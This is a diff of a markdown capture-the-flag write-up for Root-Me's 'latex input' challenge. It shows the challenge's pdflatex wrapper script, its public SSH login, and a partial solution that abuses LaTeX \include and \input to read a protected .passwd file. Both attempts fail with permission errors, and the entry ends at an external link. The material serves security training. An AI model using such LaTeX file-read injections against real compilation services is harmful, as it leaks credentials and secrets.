@@ -321,32 +321,198 @@ This returns the password
 
 ## latex input
 
-- Author: name
-- X Points
+- Author: Podalirus, Mhd_Root
+- Date: 17 March 2021
+- Points: 10
+- Level: 1
 
-### Description
+### Statement
 
-Description Here
+Do you know how the input command works?
 
-### Hints
+<details>
 
-1. Hint 1
+<summary markdown="span">Source Code</summary>
+
+~~~bash
+    #!/usr/bin/env bash
+     
+    if [[ $# -ne 1 ]]; then
+        echo "Usage : ${0} TEX_FILE"
+    fi
+     
+    if [[ -f "${1}" ]]; then
+        TMP=$(mktemp -d)
+        cp "${1}" "${TMP}/main.tex"
+     
+        # Compilation
+        echo "[+] Compilation ..."
+        timeout 5 /usr/bin/pdflatex \
+            -halt-on-error \
+            -output-format=pdf \
+            -output-directory "${TMP}" \
+            -no-shell-escape \
+            "${TMP}/main.tex" > /dev/null
+     
+        timeout 5 /usr/bin/pdflatex \
+            -halt-on-error \
+            -output-format=pdf \
+            -output-directory "${TMP}" \
+            -no-shell-escape \
+            "${TMP}/main.tex" > /dev/null
+     
+        chmod u+w "${TMP}/main.tex"
+        rm "${TMP}/main.tex"
+        chmod 750 -R "${TMP}"
+        if [[ -f "${TMP}/main.pdf" ]]; then
+            echo "[+] Output file : ${TMP}/main.pdf"
+        else
+            echo "[!] Compilation error, your logs : ${TMP}/main.log"
+        fi
+    else
+        echo "[!] Can't access file ${1}"
+    fi
+~~~
+
+</details>
 
 ### Connection Details
 
-1. Detail 1
+- Host: challenge02.root-me.org
+- Protocol: SSH
+- Port: 2222
+- SSH access: ssh -p 2222 app-script-ch23@challenge02.root-me.org
+- Username: app-script-ch23
+- Password: app-script-ch23
 
-### Attachments
+### Resources
 
-1. Attachment 1
+1. [Latex Cheat Sheet](https://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Cheat%20Sheet.pdf).
+2. [Latex Guide](https://repository.root-me.org/Programmation/Latex/EN%20-%20Latex%20Guide.pdf).
 
 ### Solutions
 
 <details>
 
-<summary markdown="span">Solution 1</summary>
+<summary markdown="span">Solution</summary>
 
-Detail here
+We can connect to the challenge server using ssh:
+
+~~~shell
+$ ssh -p 2222 app-script-ch23@challenge02.root-me.org
+~~~
+
+We can see the /tmp and /var/tmp directories are writable.
+  
+Reviewing the source code we can see this will take a tex file input and generate a pdf.  Let's make a simple tex file in /tmp:
+  
+~~~shell
+$vim
+  :edit /tmp/test.tex
+~~~
+  
+Our tex file:
+
+~~~
+\documentclass[12pt]{article}
+
+\begin{document}
+
+\section*{What is the password?}
+
+The password is in /challenge/app-script/ch23/.passwd
+
+\end{document}
+~~~
+  
+We can compile it using the ch23.sh bash script:
+
+~~~shell
+app-script-ch23@challenge02:~$ ./ch23.sh /tmp/test.tex
+[+] Compilation ...
+[+] Output file : /tmp/tmp.3dMDb4qjob/main.pdf
+~~~
+  
+We can see the pdf with the auxiliary and log files:
+
+~~~shell
+app-script-ch23@challenge02:~$ ls /tmp/tmp.3dMDb4qjob
+main.aux  main.log  main.pdf
+~~~
+  
+We can retrieve the file from our local machine using rsync:
+
+~~~shell
+$ rsync -e "ssh -p 2222" -avz app-script-ch23@challenge02.root-me.org:/tmp/tmp.3dMDb4qjob ~/Downloads
+~~~
+
+All looks good.  How do we open the .passwd file from LaTeX?  Let's try include and input:
+
+~~~
+\documentclass[12pt]{article}
+
+\begin{document}
+
+\section*{What is the password?}
+
+The password is in /challenge/app-script/ch23/.passwd
+
+\subsection*{Include command}
+Include command returns:\\
+\include{/challenge/app-script/ch23/.passwd}
+
+\subsection*{Input command}
+Input command returns:\\
+\input{/challenge/app-script/ch23/.passwd}
+
+\end{document}
+~~~
+
+Recompile:
+
+~~~shell
+app-script-ch23@challenge02:~$ ./ch23.sh /tmp/test.tex
+[+] Compilation ...
+
+/usr/bin/pdflatex: Not writing to /challenge/app-script/ch23/.passwd.aux (openout_any = p).
+
+/usr/bin/pdflatex: Not writing to /challenge/app-script/ch23/.passwd.aux (openout_any = p).
+[+] Output file : /tmp/tmp.tOJiNUPTQW/main.pdf
+~~~
+
+This returns a corrupt pdf.  Let's try just the input command:
+
+~~~
+\documentclass[12pt]{article}
+
+\begin{document}
+
+\section*{What is the password?}
+
+The password is in /challenge/app-script/ch23/.passwd
+
+\subsection*{Input command}
+Input command returns:\\
+\input{/challenge/app-script/ch23/.passwd}
+
+\end{document}
+~~~
+
+The compiler will try to open the passwd file but it fails:
+
+~~~shell
+app-script-ch23@challenge02:~$ ./ch23.sh /tmp/test.tex
+[+] Compilation ...
+/challenge/app-script/ch23/.passwd: Permission denied
+/challenge/app-script/ch23/.passwd: Permission denied
+[!] Compilation error, your logs : /tmp/tmp.EePjlHYI8I/main.log
+~~~
+
+Perhaps there is an alternative package we can use?  We can look for all directories used by tex for compiling:
+  
+~~~shell
+https://0day.work/hacking-with-latex/
+~~~
 
 </details>
 
